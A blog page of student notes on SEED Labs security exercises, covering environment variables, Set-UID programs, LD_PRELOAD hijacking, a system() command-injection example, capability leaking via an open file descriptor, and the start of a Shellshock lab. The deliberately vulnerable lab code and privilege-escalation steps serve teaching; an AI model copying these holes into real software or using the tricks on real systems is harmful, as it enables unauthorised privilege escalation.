<!--
	作者：Sariay
	时间：2018-08-26
	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
-->
<!DOCTYPE html>
<html class="html-loading">
		

<head>
	<meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <title>
    
      《信息安全导论》配套实验 | Archeri&#39;s Blog
    
  </title>
  <meta name="author" content="Archeri Shade">
  <meta name="keywords" content="" />
  <meta name="description" content="" />
	<!-- favicon -->
  <link rel="shortcut icon" href="/img/favicon.ico">

  <!-- css -->
  
<link rel="stylesheet" href="/css/Annie.css">

  
  <!-- jquery -->
	
<script src="/plugin/jquery/jquery.min.js"></script>


<script>
    const CONFIG_BGIMAGE = {
      mode: 'random_you',
      normalSrc: '/img/header-bg.jpg',
      randomYouMax: 7,
      randomYouSrc: '/img/Random-img/',
	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
	  preloaderEnable: true
    }
	
    const CONFIG_LEACLOUD_COUNT = {
      enable: false,
	  appId: 'AU8...',
	  appKey: '4cU...',
	  serverURLs: 'http' || ' '
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>
	<body>
		<!-- Preloader -->

	<div id="preloader">
		<div class="pre-container">
			
				<div class="spinner">
					<div class="double-bounce1"></div>
					<div class="double-bounce2"></div>
				</div>
						
		</div>
	</div>


<!-- header -->
<header class="fixbackground bg-pan-br">
	<div class="mask">
		<!-- motto -->
		<div class="h-body">	
			
				<div class="motto text-shadow-pop-left">
					<p class="content" id="motto-content">获取中...</p>
					<p>-<p>
					<p class="author" id="motto-author">Just a minute...</p>
				</div>
			
		</div>
		
		<!-- others: such as time... -->			
		<div class="h-footer">
			<a href="javascript:;" id="read-more" class="scroll-down">
				<span class="icon-anchor1 animation-scroll-down"></span>
			</a>
		</div>
	</div>
</header>

<div id="navigation-hide">
	<!-- Progress bar -->
	<div id="progress-bar"></div>

	<!-- Progress percent -->
	<div id="progress-percentage"><span>0.0%</span></div>

	<div class="toc-switch"><span class="switch-button">目录</span></div>

	<!-- Page title -->
	<p>
		
			「《信息安全导论》配套实验」
		
	</p>

	
	

	<!-- Nav trigger for navigation-H-->
	<a class="nav-trigger"><span></span></a>
</div>

<!-- Navigation in div(id="navigation-H") -->
<nav class="nav-container" id="cd-nav">
	<div class="nav-header">
		<span class="logo"> 
			<img src="/img/logo.png">
		</span>
		<a href="javascript:;" class="nav-close"></a>
	</div>
	
	<div class="nav-body">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-categories">
			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about" target="_blank">关于</a>
		</li>
		
	
		<li class="menu-gallery">
			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
		</li>
		
	

	
		<li class="menu-search">
			<a href="javascript:;" class="popup-trigger">搜索</a>
		</li>
	
</ul>
	</div>
	
	<div class="nav-footer">
		<ul id="global-social">
	
		<li>
			<a href="https://github.com/ArcheriShade" target="_blank">
				<span class="icon-github"></span>
			</a>
		</li>
			
</ul>

	</div>
</nav>
			
		<!--main-->
		<main>
			<!--
	时间：2018-11-17
	描述：
		插件名称：katelog.min.js
		插件作者：KELEN
		插件来源: https://github.com/KELEN/katelog
-->

	
		<div class="layout-toc">
			<div id="layout-toc">
				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
			</div>
		</div>

		
<script src="/plugin/toc/katelog.min.js"></script>


		
	 

<div class="layout-post">
	<div id="layout-post">
		<div class="article-title">
			
	<a href="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/" itemprop="url">
		《信息安全导论》配套实验
	</a>

		</div>

		<div class="article-meta">
			<span>
				<i class="icon-calendar1"></i>
				
				




	更新于

	<a href="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/" itemprop="url">
		<time datetime="2023-03-06T02:23:16.000Z" itemprop="dateUpdated">
	  		2023-03-06
	  </time>
	</a> 



			</span>
			<span>
				
	<i class="icon-price-tags"></i>
	
		<a href="/tags/SEED/" class=" ">
			SEED
		</a>
	
		<a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA/" class=" ">
			信息安全导论
		</a>
	
		<a href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" class=" ">
			软件安全
		</a>
	
		<a href="/tags/Web%E5%AE%89%E5%85%A8/" class=" ">
			Web安全
		</a>
	
		<a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class=" ">
			网络安全
		</a>
	
		<a href="/tags/SEEDlabs/" class=" ">
			SEEDlabs
		</a>
	
		
			</span>
			
			



		</div>

		<div class="article-content" id="article-content">
			<p>&#x3D;&#x3D;目前只有前两大章的内容，第三章网络安全还没看&#x3D;&#x3D;</p>
<h1 id="01-Environment-Variable-and-SetUID"><a href="#01-Environment-Variable-and-SetUID" class="headerlink" title="01_Environment_Variable_and_SetUID"></a>01_Environment_Variable_and_SetUID</h1><h2 id="Task-1-Manipulating-Environment-Variables"><a href="#Task-1-Manipulating-Environment-Variables" class="headerlink" title="Task 1: Manipulating Environment Variables"></a>Task 1: Manipulating Environment Variables</h2><blockquote>
<p>The default shell that a user uses is set in the <code>/etc/passwd</code> file (the <strong>last field</strong> of each entry). </p>
</blockquote>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20221214104436477.png" alt="image-20221214104436477"></p>
<blockquote>
<p>You can change this to another shell program using the command <code>chsh</code> (please do not do it for this lab). </p>
</blockquote>
<blockquote>
<p>Use <code>printenv</code> or <code>env</code> command to print out the environment variables. If you are interested in some particular environment variables, such as <code>PWD</code>, you can use <code>printenv PWD</code> or <code>env | grep PWD</code></p>
</blockquote>
<p><del>有一个环境变量<code>_</code>，似乎指代的是当前运行的程序</del></p>
<p>环境变量<code>_</code>，指代的是上一个执行的command</p>
<p><code>printenv</code>中的是：<code>_=/usr/bin/printenv</code><br><code>env</code>中的是：<code>_=/usr/bin/env</code></p>
<blockquote>
<p>Use <code>export</code> and <code>unset</code> to set or unset environment variables. It should be noted that these two commands are not separate programs; they are two of the Bash’s internal commands (you will not be able to find them outside of Bash).</p>
</blockquote>
<p><code>export my_env=123</code>，之后可以在<code>printenv</code>和<code>env</code>程序中找到（shell变量）</p>
<p><code>unset my_env</code>，之后找不到了</p>
<h2 id="Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><a href="#Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process" class="headerlink" title="Task 2: Passing Environment Variables from Parent Process to Child Process"></a>Task 2: Passing Environment Variables from Parent Process to Child Process</h2><blockquote>
<p>In Unix, <code>fork()</code> creates a new process by duplicating the calling process.</p>
<p>The new process, referred to as the child, is an exact duplicate of the calling process, referred to as the parent; however, several things are not inherited by the child (please see the manual of <code>fork()</code> by typing the following command: <code>man fork</code>). </p>
</blockquote>
<blockquote>
<p><strong>Step 1.</strong> Please compile and run the following program, and describe your observation. The program can be found in the <code>Labsetup</code> folder; it can be compiled using <code>gcc myprintenv.c</code>, which will generate a binary called <code>a.out</code>. Let’s run it and save the output into a file using <code>a.out &gt; file</code>.</p>
</blockquote>
<p><code>gcc myprintenv.c</code>编译，生成<code>a.out</code></p>
<p><code>a.out &gt; file</code>运行并保存结果</p>
<p><code>fork()</code>之后，在父进程中返回生成的子进程的PID，在子进程中返回0</p>
<blockquote>
<p><strong>Step 2.</strong> Now comment out the <code>printenv()</code> statement in the child process case (Line ①), and uncomment the <code>printenv()</code> statement in the parent process case (Line ②). <strong>Compile and run the code again</strong>, and describe your observation. Save the output in another file.</p>
</blockquote>
<p>重新编译，<code>gcc myprintenv.c -o new_a.o</code>，生成新的程序<code>new_a.o</code></p>
<p>生成新的结果文件，<code>new_a.o &gt; file_new_new</code></p>
<p>对比两个文件，<code>diff file_new file_new_new</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">48c48</span><br><span class="line">&lt; _=./a.out</span><br><span class="line">---</span><br><span class="line">&gt; _=./new_a.o</span><br></pre></td></tr></table></figure>

<p>似乎是当前运行进程的<code>_</code>环境变量不一样了</p>
<blockquote>
<p>48c48，意思是左边文件的48行变成了右边文件的48行</p>
</blockquote>
<h2 id="Task-3-Environment-Variables-and-execve"><a href="#Task-3-Environment-Variables-and-execve" class="headerlink" title="Task 3: Environment Variables and execve()"></a>Task 3: Environment Variables and <code>execve()</code></h2><blockquote>
<p>The function <code>execve()</code> calls a system call to load a new command and execute it; this function never returns.</p>
<p>No new process is created; instead, the calling process’s text, data, bss, and stack are overwritten by that of the program loaded. Essentially, <code>execve()</code> runs the new program inside the calling process.</p>
</blockquote>
<blockquote>
<p><strong>Step 1.</strong> Please compile and run the following program, and describe your observation. This program simply executes a program called <code>/usr/bin/env</code>, which prints out the environment variables of the current process.</p>
</blockquote>
<p>编译，<code>gcc myenv.c -o 1.out</code>，运行，<code>1.out &gt; 1file</code>，查看，<code>cat 1file</code>，发现什么都没有</p>
<blockquote>
<p><strong>Step 2.</strong> Change the invocation of <code>execve()</code> in Line ① to the following; describe your observation.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/usr/bin/env&quot;</span>, argv, environ);</span><br></pre></td></tr></table></figure>

<p>改完后重新编译并运行，发现能打印出<code>2.out</code>运行时的环境变量</p>
<p>结论是<code>execve()</code>的第三个参数传入指定环境变量</p>
<h2 id="Task-4-Environment-Variables-and-system"><a href="#Task-4-Environment-Variables-and-system" class="headerlink" title="Task 4: Environment Variables and system()"></a>Task 4: Environment Variables and <code>system()</code></h2><blockquote>
<p>This function is used to execute a command, but unlike <code>execve()</code>, which directly executes a command, <code>system()</code> actually executes <code>/bin/sh -c command</code>, i.e., it executes <code>/bin/sh</code>, and <strong>asks the shell to execute the command</strong>.</p>
</blockquote>
<blockquote>
<p>If you look at the implementation of the <code>system()</code> function, you will see that it uses <code>execl()</code> to execute <code>/bin/sh</code>; <code>execl()</code> calls <code>execve()</code>, passing to it the environment variables array. Therefore, using <code>system()</code>, the environment variables of the calling process is passed to the new program <code>/bin/sh</code>. Please compile and run the following program to verify this.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/usr/bin/env&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译后运行，true dude</p>
<h2 id="Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 5: Environment Variable and Set-UID Programs"></a>Task 5: Environment Variable and <code>Set-UID</code> Programs</h2><blockquote>
<p>When a <code>Set-UID</code> program runs, it assumes the owner’s privileges.</p>
</blockquote>
<blockquote>
<p><strong>Step 1.</strong> Write the following program that can print out all the environment variables in the current process.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (environ[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, environ[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Step 2.</strong> Compile the above program, change its ownership to root, and make it a <code>Set-UID</code> program.</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// Asssume the program’s name is foo</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> <span class="built_in">chown</span> root foo</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 4755 foo</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20221214220955283.png" alt="image-20221214220955283"></p>
<blockquote>
<p><strong>Step 3.</strong> In your shell (you need to be in a normal user account, not the <code>root</code> account), use the <code>export</code> command to set the following environment variables (they may have already exist):</p>
<ul>
<li><code>PATH</code></li>
<li><code>LD_LIBRARY_PATH</code></li>
<li><code>ANY_NAME</code> (this is an environment variable defined by you, so pick whatever name you want).</li>
</ul>
<p>These environment variables are set in the user’s shell process. Now, run the <code>Set-UID</code> program from Step 2 in your shell. After you type the name of the program in your shell, the shell forks a child process, and uses the child process to run the program. Please check whether all the environment variables you set in the shell process (parent) get into the <code>Set-UID</code> child process. Describe your observation. If there are surprises to you, describe them.</p>
</blockquote>
<p>定义了一个自己的环境变量<code>export my_env=123456</code></p>
<p>然后运行<code>foo</code>，发现除了<code>LD_LIBRARY_PATH</code>都打印了出来</p>
<h2 id="Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 6: The PATH Environment Variable and Set-UID Programs"></a>Task 6: The PATH Environment Variable and <code>Set-UID</code> Programs</h2><p>通过执行<code>system()</code>的<code>Set-UID</code>程序，结合修改<code>PATH</code>环境变量，使攻击者达成任意命令执行的目的</p>
<p>ps：注意Ubuntu自带的保护机制</p>
<h2 id="Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 7: The LD_PRELOAD Environment Variable and Set-UID Programs"></a>Task 7: The <code>LD_PRELOAD</code> Environment Variable and <code>Set-UID</code> Programs</h2><blockquote>
<p>Several environment variables, including <code>LD_PRELOAD</code>, <code>LD_LIBRARY_PATH</code>, and other <code>LD_*</code> influence the behavior of dynamic loader&#x2F;linker.</p>
</blockquote>
<blockquote>
<p>In Linux, <code>LD_LIBRARY_PATH</code> is a colon-separated set of directories where libraries should be searched for first, before the standard set of directories. <code>LD_PRELOAD</code> specifies a list of additional, user-specified, shared libraries to be loaded before all others.</p>
</blockquote>
<blockquote>
<p><strong>Step 1.</strong> First, we will see how these environment variables influence the behavior of dynamic loader&#x2F;linker when running a normal program. Please follow these steps:</p>
</blockquote>
<blockquote>
<ol>
<li>Let us build a dynamic link library. Create the following program, and name it <code>mylib.c</code>. It basically overrides the <code>sleep()</code> function in <code>libc</code>:</li>
</ol>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sleep</span> <span class="params">(<span class="type">int</span> s)</span> &#123;</span><br><span class="line">    <span class="comment">/* If this is invoked by a privileged program,</span></span><br><span class="line"><span class="comment">    	you can do damages here! */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am not sleeping!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="2">
<li>We can compile the above program using the following commands (in the <code>-lc</code> argument, the second character is ?):</li>
</ol>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -fPIC -g -c mylib.c</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -shared -o libmylib.so.1.0.1 mylib.o -lc</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Line1 where <code>-fPIC</code> means that emit position-independent code, suitable for dynamic linking and avoiding any limit on the size of the global offset table, <code>-g</code> means producing debugging information and <code>-c</code> means compiling the file but not linking it.</p>
<p>Line2 where <code>-shared</code> produces a shared object that can be linked to other objects to form a executable, <code>-o</code> file stores the output in file.</p>
</blockquote>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20221215113042257.png" alt="image-20221215113042257"></p>
<blockquote>
<ol start="3">
<li>Now, set the LD PRELOAD environment variable:</li>
</ol>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">export</span> LD_PRELOAD=./libmylib.so.1.0.1</span></span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="4">
<li>Finally, compile the following program <code>myprog</code>, and in the same directory as the above dynamic link library <code>libmylib.so.1.0.1</code>:</li>
</ol>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* myprog.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Step 2.</strong> After you have done the above, please run <code>myprog</code> under the following conditions, and observe what happens.</p>
<ul>
<li>Make <code>myprog</code> a regular program, and run it as a normal user.</li>
<li>Make <code>myprog</code> a <code>Set-UID</code> root program, and run it as a normal user.</li>
<li>Make <code>myprog</code> a <code>Set-UID</code> root program, export the <code>LD_PRELOAD</code> environment variable again in the root account and run it.</li>
<li>Make <code>myprog</code> a <code>Set-UID</code> user1 program (i.e., the owner is user1, which is another user account), export the <code>LD_PRELOAD</code> environment variable again in a different user’s account (not-root user) and run it.</li>
</ul>
</blockquote>
<p>步骤及结果依次如下：</p>
<ul>
<li><p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20221215113737353.png" alt="image-20221215113737353"><br>执行的是自己的<code>sleep()</code>函数，说明自己导出的<code>LD_PRELOAD</code>环境变量被引入了程序中</p>
</li>
<li><p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20221215113852688.png" alt="image-20221215113852688"><br>系统休眠了一秒，说明自己导出的环境变量没有被引入程序</p>
</li>
<li><p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20221215120558577.png" alt="image-20221215120558577"><br>执行的是自定义的<code>sleep()</code>，这是因为切换root账户后，有效ID和真实ID一致了，<code>LD_PRELOAD</code>生效</p>
</li>
<li><p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20221215121248726.png" alt="image-20221215121248726"><br>切换成了tester用户，并且改成了tester的<code>Set-UID</code>程序，运行发现是自定义的<code>sleep()</code></p>
</li>
</ul>
<p>以上说明，<code>Set-UID</code>程序的<code>LD_*</code>环境变量的安全机制，是仅当真实用户ID和有效用户ID一致时，才会被引入，与root权限无关（？）</p>
<h2 id="Task-8-Invoking-External-Programs-Using-system-versus-execve"><a href="#Task-8-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="Task 8: Invoking External Programs Using system() versus execve()"></a>Task 8: Invoking External Programs Using <code>system()</code> versus <code>execve()</code></h2><blockquote>
<p><code>execve()</code> does not invoke shell.</p>
</blockquote>
<blockquote>
<p>Bob needs to be able to read all the files in the company’s Unix system; on the other hand, to protect the integrity of the system, Bob should not be able to modify any file.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">char</span> *v[<span class="number">3</span>];</span><br><span class="line">    <span class="type">char</span> *command;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please type a file name.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    v[<span class="number">0</span>] = <span class="string">&quot;/bin/cat&quot;</span>; v[<span class="number">1</span>] = argv[<span class="number">1</span>]; v[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    command = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(v[<span class="number">0</span>]) + <span class="built_in">strlen</span>(v[<span class="number">1</span>]) + <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(command, <span class="string">&quot;%s %s&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Use only one of the followings.</span></span><br><span class="line">    system(command);</span><br><span class="line">    <span class="comment">// execve(v[0], v, NULL);</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Step 1</strong>: Compile the above program, make it a root-owned Set-UID program. The program will use system() to invoke the command. If you were Bob, can you compromise the integrity of the system? For example, can you remove a file that is not writable to you?</p>
</blockquote>
<p>注意Ubuntu的防护机制</p>
<h2 id="Task-9-Capability-Leaking"><a href="#Task-9-Capability-Leaking" class="headerlink" title="Task 9: Capability Leaking"></a>Task 9: Capability Leaking</h2><blockquote>
<p>The <code>setuid()</code> system call can be used to revoke the privileges. According to the manual, “<code>setuid()</code> sets the effective user ID of the calling process. If the effective UID of the caller is root, the real UID and saved set-user-ID are also set”. Therefore, if a <code>Set-UID</code> program with effective UID 0 calls <code>setuid(n)</code>, the process will become a normal process, with all its UIDs being set to <code>n</code>.</p>
</blockquote>
<blockquote>
<p>Although the effective user ID of the process becomes non-privileged, the process is still privileged because it possesses privileged capabilities.</p>
</blockquote>
<blockquote>
<p>Compile the following program, change its owner to root, and make it a <code>Set-UID</code> program. Run the program as a normal user. Can you exploit the capability leaking vulnerability in this program? The goal is to write to the <code>/etc/zzz</code> file as a normal user.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *v[<span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Assume that /etc/zzz is an important system file,</span></span><br><span class="line"><span class="comment">    * and it is owned by root with permission 0644.</span></span><br><span class="line"><span class="comment">    * Before running this program, you should create</span></span><br><span class="line"><span class="comment">    * the file /etc/zzz first. */</span></span><br><span class="line">    fd = open(<span class="string">&quot;/etc/zzz&quot;</span>, O_RDWR | O_APPEND);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Cannot open /etc/zzz\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Print out the file descriptor value</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd is %d\n&quot;</span>, fd);</span><br><span class="line">    <span class="comment">// Permanently disable the privilege by making the</span></span><br><span class="line">    <span class="comment">// effective uid the same as the real uid</span></span><br><span class="line">    setuid(getuid());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Execute /bin/sh</span></span><br><span class="line">    v[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>; v[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    execve(v[<span class="number">0</span>], v, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20221215155409630.png" alt="image-20221215155409630"></p>
<p>编译运行上述程序后，会留下一个文件描述符，通过类似<code>echo cccccc &gt;&amp; 3</code>这样的命令就可以修改root用户的这个文件</p>
<h1 id="02-Shellshock"><a href="#02-Shellshock" class="headerlink" title="02_Shellshock"></a>02_Shellshock</h1><p>This lab covers the following topics:</p>
<ul>
<li>Shellshock</li>
<li>Environment variables</li>
<li>Function definition in bash</li>
<li>Apache and CGI programs</li>
</ul>
<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>web server: 10.9.0.80 | <a target="_blank" rel="noopener" href="http://www.seedlab-shellshock.com(修改hosts文件建立映射)/">www.seedlab-shellshock.com（修改hosts文件建立映射）</a></p>
<p><img src="/2023/03/06/%E3%80%8A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E3%80%8B%E9%85%8D%E5%A5%97%E5%AE%9E%E9%AA%8C/image-20230107103706384.png" alt="image-20230107103706384"></p>
<p>cd到实验目录</p>
<p>实验环境已经设置了一些快捷命令</p>
